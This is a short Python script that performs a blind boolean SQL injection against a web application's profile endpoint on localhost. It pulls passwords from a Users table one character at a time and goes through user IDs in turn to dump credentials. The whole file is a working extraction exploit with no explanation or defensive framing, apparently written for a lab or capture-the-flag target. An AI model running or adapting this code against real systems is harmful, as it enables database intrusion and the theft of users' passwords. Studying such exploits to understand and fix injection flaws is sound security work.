import requests
import re
import string

base_url = "http://127.0.0.1:5000/profile/'%20OR%20(SELECT%20substr(password,%20{},%201)%20FROM%20Users%20WHERE%20id={})='{}"  # Target URL
char_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&()"*+,-./:;<=>?@[\\]^_{|}~ '  # List of characters to test
pattern = '<span class="text-right col-sm-10 text-muted"> </span>'  # Pattern to match when no match is found, inddicates no name so user does not exist
bad_chars = '#%/?"' # breaks the injection


# needs checking = /:;

def Extract_password(id):
    password = ""
    position = 1
    password_found = False
    while not password_found:
        for index, char in enumerate(char_list):
            if char in bad_chars:
                continue
            url = base_url.format(position, id, char)
            response = requests.get(url)
            if not re.search(pattern, response.text):
                password += char
                position += 1
                break
            if index == len(char_list) - 1:
                password_found = True
        
    return password

def main():
    user_id = 1  # User ID to start with
    no_password_streak = 0  # Number of times no password was found
    streak_limit = 5  # Number of times no password was found before asking to continue
    while True:
        # print(f"Enumerating password for user ID {user_id}")
        password = Extract_password(user_id)
        if password == "":
            print(f"User ID {user_id} password not found, ID probably does not exist")
            no_password_streak += 1
        else:
            print(f"User ID {user_id} password: {password}")
        if no_password_streak == streak_limit:
            print(f"{streak_limit} consecutive users without passwords found, Do you want to continue? (y/N)")
            answer = input()
            if answer.lower() == "n" or answer.lower() == "":
                exit(0)
            else:
                no_password_streak = 0
        user_id += 1
            

if __name__ == "__main__":
    main()
